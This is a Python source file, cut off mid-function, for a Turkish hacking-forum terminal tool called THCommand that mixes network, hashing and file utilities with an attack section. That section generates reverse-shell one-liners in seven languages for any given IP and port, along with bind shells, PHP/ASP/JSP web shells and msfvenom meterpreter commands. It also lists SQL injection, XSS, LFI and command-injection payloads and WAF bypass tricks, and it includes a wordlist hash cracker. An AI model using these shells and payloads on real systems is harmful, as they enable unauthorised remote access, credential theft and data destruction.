#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
THCommand - TurkHackTeam Özel Siber Güvenlik & Yazılım Terminali
Geliştirici: tbabi
TurkHackTeam'e özel olarak geliştirilmiştir.

Standart CMD komutları + 80+ özel / komutu destekler.
"""

import os, sys, subprocess, socket, hashlib, base64, json, time, datetime
import struct, re, shutil, platform, ctypes, threading, urllib.request
import random, string, hmac, uuid, zipfile, sqlite3, csv, textwrap, ssl
from pathlib import Path

VERSION = "2.0.0"
AUTHOR = "tbabi"
TEAM = "TurkHackTeam"
HISTORY = []
ALIASES = {}
NOTES = []
SNIPPETS = {}
ENV_VARS = {}
TIMERS = {}

# ─── Renkler ───
class C:
    R = "\033[0m"; RED = "\033[91m"; GRN = "\033[92m"; YLW = "\033[93m"
    BLU = "\033[94m"; MAG = "\033[95m"; CYN = "\033[96m"; WHT = "\033[97m"
    BOLD = "\033[1m"; DIM = "\033[2m"; GRAY = "\033[90m"

def cprint(text, color=C.WHT):
    print(f"{color}{text}{C.R}")

def banner():
    b = f"""{C.RED}{C.BOLD}
  ╔╦╗╦ ╦╔═╗╔═╗╔╦╗╔╦╗╔═╗╔╗╔╔╦╗
   ║ ╠═╣║  ║ ║║║║║║║╠═╣║║║ ║║
   ╩ ╩ ╩╚═╝╚═╝╩ ╩╩ ╩╩ ╩╝╚╝═╩╝
{C.CYN}  ┌───────────────────────────────────────┐
  │   Siber Güvenlik & Yazılım Terminali  │
  │          Versiyon {VERSION}                │
  │                                       │
  │   Geliştirici : {AUTHOR}                   │
  │   Forum        : {TEAM}           │
  └───────────────────────────────────────┘{C.R}
{C.RED}  ★ TurkHackTeam'e Özel ★{C.R}
{C.GRAY}  Özel komutlar için /yardim yazın{C.R}
"""
    print(b)

# ─── Yardım Kategorileri ───
COMMANDS = {
    "Ağ & Keşif": {
        "/portscan": "Hedef üzerinde port taraması yap",
        "/ping": "Bir sunucuya ping at",
        "/dns": "DNS sorgulaması yap",
        "/rdns": "Ters DNS sorgulaması",
        "/whois": "WHOIS sorgulaması",
        "/myip": "Yerel IP adreslerini göster",
        "/pubip": "Genel IP adresini göster",
        "/netstat": "Aktif bağlantıları listele",
        "/traceroute": "Hedefe traceroute yap",
        "/subnet": "CIDR'dan subnet bilgisi hesapla",
        "/macaddr": "MAC adreslerini göster",
        "/httpheaders": "URL'nin HTTP başlıklarını getir",
        "/arpscan": "ARP tablosunu göster",
        "/bannergrep": "Servisten banner bilgisi al",
        "/subdom": "Alt alan adı taraması yap",
    },
    "Hash & Kodlama": {
        "/hash": "Metin hashle (md5/sha1/sha256/sha512)",
        "/hashfile": "Dosya hashle",
        "/hashcrack": "Hash kırma denemesi (wordlist)",
        "/b64enc": "Base64 ile kodla",
        "/b64dec": "Base64 çöz",
        "/hexenc": "Hex ile kodla",
        "/hexdec": "Hex çöz",
        "/urlenc": "URL encode yap",
        "/urldec": "URL decode yap",
        "/rot13": "ROT13 kodla/çöz",
        "/crc32": "CRC32 hesapla",
        "/hmacgen": "HMAC imzası oluştur",
        "/xorenc": "XOR şifreleme yap",
        "/encode_all": "Tüm formatlarda kodla",
    },
    "Şifre & Güvenlik": {
        "/passgen": "Güçlü şifre üret",
        "/passcheck": "Şifre gücünü kontrol et",
        "/uuid": "UUID oluştur",
        "/randstr": "Rastgele metin üret",
        "/entropy": "Metin entropisini hesapla",
    },
    "Saldırı & Payload": {
        "/revshell": "Reverse shell kodu üret",
        "/sqli": "SQL injection test dizgileri",
        "/xss": "XSS payload örnekleri",
        "/lfi": "LFI test yolları",
        "/cmdinj": "Command injection örnekleri",
        "/payloads": "Yaygın payload listesi",
        "/shellgen": "Shell kodu üretici",
        "/wafbypass": "WAF bypass teknikleri",
    },
    "Dosya İşlemleri": {
        "/hexdump": "Dosyanın hex dökümü",
        "/fileinfo": "Detaylı dosya bilgisi",
        "/find": "Dosya ara (pattern)",
        "/grep": "Dosyalarda metin ara",
        "/wc": "Satır/kelime/karakter say",
        "/head": "İlk N satırı göster",
        "/tail": "Son N satırı göster",
        "/diff": "İki dosyayı karşılaştır",
        "/shred": "Dosyayı güvenli sil",
        "/tree": "Dizin ağacı görünümü",
        "/sizeof": "Dizin boyutunu hesapla",
        "/checksum": "Dosya bütünlüğü doğrula",
    },
    "Sistem & Süreç": {
        "/sysinfo": "Sistem bilgisi",
        "/procs": "Çalışan süreçleri listele",
        "/kill": "PID ile süreci sonlandır",
        "/env": "Ortam değişkenlerini göster",
        "/setenv": "Ortam değişkeni ayarla",
        "/uptime": "Sistem çalışma süresi",
        "/diskusage": "Disk kullanımı",
        "/meminfo": "Bellek kullanımı",
        "/whoami": "Kullanıcı bilgisi",
        "/services": "Çalışan servisleri listele",
    },
    "Geliştirici Araçları": {
        "/json": "JSON formatla / doğrula",
        "/jsonfile": "JSON dosyasını formatla",
        "/regex": "Regex testi yap",
        "/epoch": "Epoch zaman damgası çevir",
        "/now": "Şu anki tarih/saat bilgisi",
        "/calc": "Hesap makinesi",
        "/snippet": "Kod parçacığı kaydet/yükle",
        "/todo": "TODO notları yönet",
        "/timer": "Zamanlayıcı başlat/durdur",
        "/color": "Terminal renk kodları",
        "/lorem": "Lorem ipsum metni üret",
        "/csv2json": "CSV'yi JSON'a çevir",
    },
    "Web Güvenlik": {
        "/sslinfo": "SSL sertifika bilgisi",
        "/secheaders": "Güvenlik başlıklarını kontrol et",
        "/crawl": "Basit web tarayıcı",
        "/dirscan": "Dizin taraması yap",
    },
    "Terminal & Yardımcı": {
        "/alias": "Komut kısayolu oluştur",
        "/history": "Komut geçmişi",
        "/clear": "Terminali temizle",
        "/export": "Geçmişi dosyaya aktar",
        "/reload": "Terminali yeniden başlat",
        "/hakkinda": "THCommand hakkında",
        "/banner": "Banner'ı tekrar göster",
        "/yardim": "Bu yardım menüsü",
        "/help": "Bu yardım menüsü",
    },
}

def show_help():
    cprint("\n  ╔═══════════════════════════════════════════╗", C.CYN)
    cprint("  ║    THCommand - Özel Komutlar Listesi      ║", C.CYN)
    cprint("  ║    Geliştirici: tbabi | TurkHackTeam       ║", C.CYN)
    cprint("  ╚═══════════════════════════════════════════╝\n", C.CYN)
    for cat, cmds in COMMANDS.items():
        cprint(f"  ┌── {cat} ──", C.YLW)
        for cmd, desc in cmds.items():
            print(f"  {C.GRN}{cmd:18s}{C.GRAY}{desc}{C.R}")
        print()
    total = sum(len(v) for v in COMMANDS.values())
    cprint(f"  Toplam: {total} özel komut | Standart CMD komutları da çalışır.\n", C.DIM)


# ─── Ağ & Keşif Komutları ───
def cmd_portscan(args):
    if len(args) < 1:
        cprint("Kullanım: /portscan <hedef> [başlangıç-bitiş]", C.YLW); return
    host = args[0]
    ports = range(1, 1025)
    if len(args) > 1 and '-' in args[1]:
        s, e = args[1].split('-'); ports = range(int(s), int(e)+1)
    cprint(f"  {host} taranıyor ({len(ports)} port)...", C.CYN)
    open_ports = []
    for p in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3); r = s.connect_ex((host, p)); s.close()
            if r == 0:
                open_ports.append(p)
                try:
                    service = socket.getservbyport(p)
                except:
                    service = "bilinmiyor"
                cprint(f"  [AÇIK] Port {p} ({service})", C.GRN)
        except: pass
    if not open_ports: cprint("  Açık port bulunamadı.", C.RED)
    else: cprint(f"\n  {len(open_ports)} açık port bulundu.", C.GRN)

def cmd_ping(args):
    if not args: cprint("Kullanım: /ping <hedef> [sayı]", C.YLW); return
    host = args[0]; count = args[1] if len(args) > 1 else "4"
    flag = "-n" if os.name == "nt" else "-c"
    os.system(f"ping {flag} {count} {host}")

def cmd_dns(args):
    if not args: cprint("Kullanım: /dns <alan_adı>", C.YLW); return
    try:
        ips = socket.getaddrinfo(args[0], None)
        seen = set()
        cprint(f"  {args[0]} DNS sonuçları:", C.CYN)
        for info in ips:
            ip = info[4][0]
            if ip not in seen:
                seen.add(ip); cprint(f"  → {ip}", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_rdns(args):
    if not args: cprint("Kullanım: /rdns <ip>", C.YLW); return
    try:
        host = socket.gethostbyaddr(args[0])
        cprint(f"  {args[0]} → {host[0]}", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_whois(args):
    if not args: cprint("Kullanım: /whois <alan_adı>", C.YLW); return
    os.system(f"whois {args[0]}")

def cmd_myip(args):
    cprint("  Yerel IP Adresleri:", C.CYN)
    hostname = socket.gethostname()
    cprint(f"  Makine Adı: {hostname}", C.GRN)
    try:
        for ip in socket.getaddrinfo(hostname, None):
            cprint(f"  → {ip[4][0]}", C.GRN)
    except: pass

def cmd_pubip(args):
    try:
        ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
        cprint(f"  Genel IP: {ip}", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_netstat(args):
    os.system("netstat -an" if os.name == "nt" else "netstat -tulnp")

def cmd_traceroute(args):
    if not args: cprint("Kullanım: /traceroute <hedef>", C.YLW); return
    cmd = "tracert" if os.name == "nt" else "traceroute"
    os.system(f"{cmd} {args[0]}")

def cmd_subnet(args):
    if not args: cprint("Kullanım: /subnet <ip/cidr> (ör: 192.168.1.0/24)", C.YLW); return
    try:
        ip_str, cidr = args[0].split('/')
        cidr = int(cidr)
        ip_parts = list(map(int, ip_str.split('.')))
        ip_int = (ip_parts[0]<<24)|(ip_parts[1]<<16)|(ip_parts[2]<<8)|ip_parts[3]
        mask = (0xFFFFFFFF << (32 - cidr)) & 0xFFFFFFFF
        network = ip_int & mask
        broadcast = network | (~mask & 0xFFFFFFFF)
        def to_ip(n): return '.'.join(str((n>>s)&0xFF) for s in [24,16,8,0])
        cprint(f"  Ağ:        {to_ip(network)}", C.GRN)
        cprint(f"  Broadcast: {to_ip(broadcast)}", C.GRN)
        cprint(f"  Maske:     {to_ip(mask)}", C.GRN)
        cprint(f"  Host:      {broadcast - network - 1}", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_macaddr(args):
    os.system("getmac" if os.name == "nt" else "ip link show")

def cmd_httpheaders(args):
    if not args: cprint("Kullanım: /httpheaders <url>", C.YLW); return
    try:
        url = args[0] if args[0].startswith("http") else "http://"+args[0]
        r = urllib.request.urlopen(url, timeout=5)
        cprint(f"  {url} HTTP Başlıkları:", C.CYN)
        for k, v in r.headers.items():
            cprint(f"  {k}: {v}", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_arpscan(args):
    os.system("arp -a")

def cmd_bannergrep(args):
    if not args: cprint("Kullanım: /bannergrep <hedef> [port]", C.YLW); return
    host = args[0]; port = int(args[1]) if len(args) > 1 else 80
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3); s.connect((host, port))
        s.send(b"HEAD / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        banner_data = s.recv(4096).decode(errors='ignore'); s.close()
        cprint(f"  {host}:{port} Banner:", C.CYN)
        for line in banner_data.split('\n'):
            cprint(f"  {line.rstrip()}", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_subdom(args):
    if not args: cprint("Kullanım: /subdom <alan_adı>", C.YLW); return
    domain = args[0]
    subs = ["www","mail","ftp","admin","panel","cpanel","webmail","ns1","ns2",
            "smtp","pop","imap","api","dev","test","staging","blog","shop",
            "store","cdn","media","static","app","portal","vpn","remote",
            "git","svn","db","mysql","phpmyadmin","secure","login","m"]
    cprint(f"  {domain} alt alan adı taraması...", C.CYN)
    found = 0
    for sub in subs:
        full = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(full)
            cprint(f"  [BULUNDU] {full} → {ip}", C.GRN); found += 1
        except: pass
    cprint(f"\n  {found} alt alan adı bulundu.", C.CYN)


# ─── Hash & Kodlama ───
def cmd_hash(args):
    if len(args) < 2: cprint("Kullanım: /hash <algoritma> <metin> (md5/sha1/sha256/sha512)", C.YLW); return
    algo, text = args[0], ' '.join(args[1:])
    h = hashlib.new(algo, text.encode()).hexdigest() if algo in hashlib.algorithms_available else None
    if h: cprint(f"  {algo}: {h}", C.GRN)
    else: cprint(f"  Bilinmeyen algoritma: {algo}", C.RED)

def cmd_hashfile(args):
    if len(args) < 1: cprint("Kullanım: /hashfile <dosya> [algoritma]", C.YLW); return
    algo = args[1] if len(args) > 1 else "sha256"
    try:
        h = hashlib.new(algo)
        with open(args[0], 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''): h.update(chunk)
        cprint(f"  {algo}: {h.hexdigest()}", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_hashcrack(args):
    if len(args) < 2: cprint("Kullanım: /hashcrack <hash> <wordlist_dosyası> [algoritma]", C.YLW); return
    target_hash = args[0].lower()
    wordlist = args[1]
    algo = args[2] if len(args) > 2 else "md5"
    try:
        cprint(f"  Hash kırma denemesi başlatılıyor ({algo})...", C.CYN)
        count = 0
        with open(wordlist, 'r', errors='ignore') as f:
            for line in f:
                word = line.strip()
                if not word: continue
                count += 1
                h = hashlib.new(algo, word.encode()).hexdigest()
                if h == target_hash:
                    cprint(f"  [BULUNDU!] {target_hash} → {word}", C.GRN)
                    cprint(f"  {count} deneme yapıldı.", C.GRAY)
                    return
        cprint(f"  Bulunamadı. {count} kelime denendi.", C.RED)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_b64enc(args):
    if not args: cprint("Kullanım: /b64enc <metin>", C.YLW); return
    cprint(f"  {base64.b64encode(' '.join(args).encode()).decode()}", C.GRN)

def cmd_b64dec(args):
    if not args: cprint("Kullanım: /b64dec <metin>", C.YLW); return
    try: cprint(f"  {base64.b64decode(args[0]).decode()}", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_hexenc(args):
    if not args: cprint("Kullanım: /hexenc <metin>", C.YLW); return
    cprint(f"  {' '.join(args).encode().hex()}", C.GRN)

def cmd_hexdec(args):
    if not args: cprint("Kullanım: /hexdec <hex>", C.YLW); return
    try: cprint(f"  {bytes.fromhex(args[0]).decode()}", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_urlenc(args):
    if not args: cprint("Kullanım: /urlenc <metin>", C.YLW); return
    from urllib.parse import quote
    cprint(f"  {quote(' '.join(args))}", C.GRN)

def cmd_urldec(args):
    if not args: cprint("Kullanım: /urldec <metin>", C.YLW); return
    from urllib.parse import unquote
    cprint(f"  {unquote(' '.join(args))}", C.GRN)

def cmd_rot13(args):
    if not args: cprint("Kullanım: /rot13 <metin>", C.YLW); return
    import codecs
    cprint(f"  {codecs.encode(' '.join(args), 'rot_13')}", C.GRN)

def cmd_crc32(args):
    if not args: cprint("Kullanım: /crc32 <metin>", C.YLW); return
    import binascii
    cprint(f"  CRC32: {binascii.crc32(' '.join(args).encode()) & 0xFFFFFFFF:#010x}", C.GRN)

def cmd_hmacgen(args):
    if len(args) < 2: cprint("Kullanım: /hmacgen <anahtar> <mesaj>", C.YLW); return
    h = hmac.new(args[0].encode(), ' '.join(args[1:]).encode(), hashlib.sha256).hexdigest()
    cprint(f"  HMAC-SHA256: {h}", C.GRN)

def cmd_xorenc(args):
    if len(args) < 2: cprint("Kullanım: /xorenc <anahtar> <metin>", C.YLW); return
    key = args[0]; text = ' '.join(args[1:])
    result = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))
    cprint(f"  XOR Hex: {result.encode().hex()}", C.GRN)
    cprint(f"  XOR B64: {base64.b64encode(result.encode()).decode()}", C.GRN)

def cmd_encode_all(args):
    if not args: cprint("Kullanım: /encode_all <metin>", C.YLW); return
    text = ' '.join(args)
    cprint("  ┌── Tüm Kodlamalar ──", C.CYN)
    cprint(f"  MD5:    {hashlib.md5(text.encode()).hexdigest()}", C.GRN)
    cprint(f"  SHA1:   {hashlib.sha1(text.encode()).hexdigest()}", C.GRN)
    cprint(f"  SHA256: {hashlib.sha256(text.encode()).hexdigest()}", C.GRN)
    cprint(f"  Base64: {base64.b64encode(text.encode()).decode()}", C.GRN)
    cprint(f"  Hex:    {text.encode().hex()}", C.GRN)
    from urllib.parse import quote
    cprint(f"  URL:    {quote(text)}", C.GRN)
    import codecs
    cprint(f"  ROT13:  {codecs.encode(text, 'rot_13')}", C.GRN)

# ─── Şifre & Güvenlik ───
def cmd_passgen(args):
    length = int(args[0]) if args else 20
    chars = string.ascii_letters + string.digits + "!@#$%^&*()-_=+[]{}|;:,.<>?"
    pw = ''.join(random.SystemRandom().choice(chars) for _ in range(length))
    cprint(f"  Üretilen: {pw}", C.GRN)

def cmd_passcheck(args):
    if not args: cprint("Kullanım: /passcheck <şifre>", C.YLW); return
    pw = args[0]; score = 0; feedback = []
    if len(pw) >= 8: score += 1
    if len(pw) >= 12: score += 1
    if re.search(r'[A-Z]', pw): score += 1
    else: feedback.append("Büyük harf ekle")
    if re.search(r'[a-z]', pw): score += 1
    else: feedback.append("Küçük harf ekle")
    if re.search(r'\d', pw): score += 1
    else: feedback.append("Rakam ekle")
    if re.search(r'[!@#$%^&*]', pw): score += 1
    else: feedback.append("Özel karakter ekle")
    labels = {0:"Çok Zayıf",1:"Çok Zayıf",2:"Zayıf",3:"Orta",4:"İyi",5:"Güçlü",6:"Çok Güçlü"}
    colors = {0:C.RED,1:C.RED,2:C.RED,3:C.YLW,4:C.YLW,5:C.GRN,6:C.GRN}
    cprint(f"  Güç: {labels[score]} ({score}/6)", colors[score])
    if feedback: cprint(f"  İpuçları: {', '.join(feedback)}", C.GRAY)

def cmd_uuid_gen(args):
    cprint(f"  {uuid.uuid4()}", C.GRN)

def cmd_randstr(args):
    n = int(args[0]) if args else 16
    pool = string.ascii_letters + string.digits
    cprint(f"  {''.join(random.choices(pool, k=n))}", C.GRN)

def cmd_entropy(args):
    if not args: cprint("Kullanım: /entropy <metin>", C.YLW); return
    import math
    text = ' '.join(args); freq = {}
    for c in text: freq[c] = freq.get(c, 0) + 1
    ent = -sum((f/len(text)) * math.log2(f/len(text)) for f in freq.values())
    cprint(f"  Entropi: {ent:.4f} bit/karakter  (Toplam: {ent*len(text):.2f} bit)", C.GRN)


# ─── Saldırı & Payload ───
def cmd_revshell(args):
    if not args: cprint("Kullanım: /revshell <ip> <port> [dil]", C.YLW); return
    if len(args) < 2: cprint("Kullanım: /revshell <ip> <port> [dil]", C.YLW); return
    ip, port = args[0], args[1]
    lang = args[2].lower() if len(args) > 2 else "all"
    shells = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "nc": f"nc -e /bin/sh {ip} {port}",
        "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
        "powershell": f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}}\"",
        "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    }
    cprint(f"  ┌── Reverse Shell ({ip}:{port}) ──", C.CYN)
    if lang == "all":
        for name, shell in shells.items():
            cprint(f"\n  [{name.upper()}]", C.YLW)
            cprint(f"  {shell}", C.GRN)
    elif lang in shells:
        cprint(f"\n  [{lang.upper()}]", C.YLW)
        cprint(f"  {shells[lang]}", C.GRN)
    else:
        cprint(f"  Desteklenen diller: {', '.join(shells.keys())}", C.YLW)

def cmd_sqli(args):
    cprint("  ┌── SQL Injection Test Dizgileri ──", C.CYN)
    payloads = [
        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "1' ORDER BY 1--", "1' ORDER BY 10--",
        "' AND 1=1--", "' AND 1=2--",
        "'; DROP TABLE users--", "' OR 1=1#",
        "admin'--", "' OR ''='", "1; WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' UNION SELECT username,password FROM users--",
    ]
    for i, p in enumerate(payloads, 1):
        cprint(f"  {i:2d}. {p}", C.GRN)

def cmd_xss(args):
    cprint("  ┌── XSS Payload Örnekleri ──", C.CYN)
    payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '"><script>alert(document.cookie)</script>',
        "'-alert(1)-'",
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<marquee onstart=alert("XSS")>',
        '<details open ontoggle=alert("XSS")>',
        '<iframe src="javascript:alert(1)">',
        '{{constructor.constructor("alert(1)")()}}',
        '<a href="javascript:alert(1)">tıkla</a>',
    ]
    for i, p in enumerate(payloads, 1):
        cprint(f"  {i:2d}. {p}", C.GRN)

def cmd_lfi(args):
    cprint("  ┌── LFI (Local File Inclusion) Test Yolları ──", C.CYN)
    payloads = [
        "../../../../etc/passwd", "../../../../etc/shadow",
        "../../../../etc/hosts", "../../../../windows/system32/config/sam",
        "..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/passwd",
        "/proc/self/environ", "/proc/self/cmdline",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input", "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "expect://id", "/var/log/apache2/access.log",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]
    for i, p in enumerate(payloads, 1):
        cprint(f"  {i:2d}. {p}", C.GRN)

def cmd_cmdinj(args):
    cprint("  ┌── Command Injection Örnekleri ──", C.CYN)
    payloads = [
        "; ls", "| ls", "& ls", "&& ls", "|| ls",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "`id`", "$(id)", "; whoami", "| whoami",
        "; ping -c 3 BURP_COLLAB", "| nslookup BURP_COLLAB",
        "%0Awhoami", "; sleep 5", "& timeout 5",
    ]
    for i, p in enumerate(payloads, 1):
        cprint(f"  {i:2d}. {p}", C.GRN)

def cmd_payloads(args):
    cprint("  ┌── Yaygın Penetrasyon Payload Listesi ──", C.CYN)
    categories = {
        "Kimlik Doğrulama Bypass": ["admin' --", "' OR 1=1 --", "admin'/*"],
        "Dizin Gezinme": ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini"],
        "SSRF": ["http://127.0.0.1", "http://localhost", "http://169.254.169.254"],
        "XXE": ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'],
        "SSTI": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
    }
    for cat, items in categories.items():
        cprint(f"\n  [{cat}]", C.YLW)
        for item in items:
            cprint(f"    → {item}", C.GRN)

def cmd_shellgen(args):
    if not args: cprint("Kullanım: /shellgen <tür> (bind/web/meterpreter)", C.YLW); return
    st = args[0].lower()
    if st == "bind":
        cprint("  ┌── Bind Shell Örnekleri ──", C.CYN)
        cprint("  [NC]     nc -lvp 4444 -e /bin/sh", C.GRN)
        cprint("  [Python] python -c 'import socket,subprocess;s=socket.socket();s.bind((\"0.0.0.0\",4444));s.listen(1);c,_=s.accept();subprocess.call([\"/bin/sh\",\"-i\"],stdin=c,stdout=c,stderr=c)'", C.GRN)
    elif st == "web":
        cprint("  ┌── Web Shell Örnekleri ──", C.CYN)
        cprint("  [PHP]    <?php system($_GET['cmd']); ?>", C.GRN)
        cprint("  [ASP]    <%eval request(\"cmd\")%>", C.GRN)
        cprint("  [JSP]    <% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", C.GRN)
    elif st == "meterpreter":
        cprint("  ┌── Meterpreter Komutları ──", C.CYN)
        cprint("  msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe", C.GRN)
        cprint("  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf", C.GRN)
        cprint("  msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php", C.GRN)
    else:
        cprint("  Desteklenen türler: bind, web, meterpreter", C.YLW)

def cmd_wafbypass(args):
    cprint("  ┌── WAF Bypass Teknikleri ──", C.CYN)
    techniques = [
        "Büyük/küçük harf karıştırma: SeLeCt, UnIoN",
        "Yorum ekleme: UN/**/ION SE/**/LECT",
        "URL kodlama: %55%4e%49%4f%4e (UNION)",
        "Çift URL kodlama: %2527 (%27 = ')",
        "NULL byte: %00",
        "Satır sonu: %0a, %0d",
        "Tab karakteri: %09",
        "Unicode: \\u0027 (tek tırnak)",
        "Hex kodlama: 0x756e696f6e (union)",
        "Concat: CONCAT(0x73656c656374)",
        "HPP: param=val1&param=val2",
        "JSON body: {'param':'payload'}",
        "Multipart form: Content-Type: multipart/form-data",
    ]
    for i, t in enumerate(techniques, 1):
        cprint(f"  {i:2d}. {t}", C.GRN)


# ─── Dosya İşlemleri ───
def cmd_hexdump(args):
    if not args: cprint("Kullanım: /hexdump <dosya> [byte]", C.YLW); return
    try:
        n = int(args[1]) if len(args) > 1 else 256
        with open(args[0], 'rb') as f: data = f.read(n)
        for i in range(0, len(data), 16):
            chunk = data[i:i+16]
            hx = ' '.join(f'{b:02x}' for b in chunk)
            asc = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
            cprint(f"  {i:08x}  {hx:<48s}  |{asc}|", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_fileinfo(args):
    if not args: cprint("Kullanım: /fileinfo <dosya>", C.YLW); return
    try:
        p = Path(args[0]); s = p.stat()
        cprint(f"  Ad:          {p.name}", C.GRN)
        cprint(f"  Yol:         {p.absolute()}", C.GRN)
        cprint(f"  Boyut:       {s.st_size:,} byte", C.GRN)
        cprint(f"  Oluşturulma: {datetime.datetime.fromtimestamp(s.st_ctime)}", C.GRN)
        cprint(f"  Değiştirilme:{datetime.datetime.fromtimestamp(s.st_mtime)}", C.GRN)
        cprint(f"  Tür:         {'Dizin' if p.is_dir() else p.suffix or 'Dosya'}", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_find(args):
    if not args: cprint("Kullanım: /find <desen> [dizin]", C.YLW); return
    d = args[1] if len(args) > 1 else "."
    count = 0
    for root, dirs, files in os.walk(d):
        for f in files:
            if re.search(args[0], f, re.IGNORECASE):
                cprint(f"  {os.path.join(root, f)}", C.GRN); count += 1
                if count >= 50: cprint("  ... (50 sınırı)", C.YLW); return
    cprint(f"  {count} dosya bulundu.", C.CYN)

def cmd_grep(args):
    if len(args) < 2: cprint("Kullanım: /grep <desen> <dosya/dizin>", C.YLW); return
    pattern, target = args[0], args[1]
    def search_file(fp):
        try:
            with open(fp, 'r', errors='ignore') as f:
                for i, line in enumerate(f, 1):
                    if re.search(pattern, line, re.IGNORECASE):
                        cprint(f"  {fp}:{i}: {line.rstrip()}", C.GRN)
        except: pass
    if os.path.isfile(target): search_file(target)
    else:
        for root, _, files in os.walk(target):
            for f in files: search_file(os.path.join(root, f))

def cmd_wc(args):
    if not args: cprint("Kullanım: /wc <dosya>", C.YLW); return
    try:
        with open(args[0], 'r', errors='ignore') as f: content = f.read()
        lines = content.count('\n'); words = len(content.split()); chars = len(content)
        cprint(f"  Satır: {lines}  Kelime: {words}  Karakter: {chars}", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_head(args):
    if not args: cprint("Kullanım: /head <dosya> [n]", C.YLW); return
    n = int(args[1]) if len(args) > 1 else 10
    try:
        with open(args[0], 'r', errors='ignore') as f:
            for i, line in enumerate(f):
                if i >= n: break
                print(f"  {line.rstrip()}")
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_tail(args):
    if not args: cprint("Kullanım: /tail <dosya> [n]", C.YLW); return
    n = int(args[1]) if len(args) > 1 else 10
    try:
        with open(args[0], 'r', errors='ignore') as f:
            lines = f.readlines()
        for line in lines[-n:]: print(f"  {line.rstrip()}")
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_diff(args):
    if len(args) < 2: cprint("Kullanım: /diff <dosya1> <dosya2>", C.YLW); return
    try:
        with open(args[0]) as f1, open(args[1]) as f2:
            l1, l2 = f1.readlines(), f2.readlines()
        import difflib
        for line in difflib.unified_diff(l1, l2, fromfile=args[0], tofile=args[1]):
            c = C.GRN if line.startswith('+') else C.RED if line.startswith('-') else C.GRAY
            cprint(f"  {line.rstrip()}", c)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_shred(args):
    if not args: cprint("Kullanım: /shred <dosya>", C.YLW); return
    try:
        p = Path(args[0]); sz = p.stat().st_size
        with open(p, 'wb') as f:
            for _ in range(3): f.seek(0); f.write(os.urandom(sz))
        p.unlink()
        cprint(f"  Güvenli silindi: {args[0]}", C.GRN)
    except Exception as e: cprint(f"  Hata: {e}", C.RED)

def cmd_tree(args):
    d = args[0] if args else "."
    def _tree(path, prefix="", depth=0):
        if depth > 3: return
